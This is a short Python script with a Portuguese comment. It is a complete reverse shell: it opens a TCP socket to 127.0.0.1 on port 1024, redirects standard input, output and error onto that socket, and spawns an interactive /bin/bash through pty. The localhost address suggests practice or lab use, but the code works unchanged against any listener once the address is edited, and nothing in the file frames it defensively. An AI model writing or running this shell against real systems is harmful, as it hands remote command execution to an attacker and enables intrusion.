import socket,os,pty

s = socket.socket()
# se nao colocar nada ele cria um socket padrão do tipo TCP/IP
s.connect(("127.0.0.1", 1024))

for fd in (0,1,2):
    os.dup2(s.fileno(),fd)
    
pty.spawn('/bin/bash')

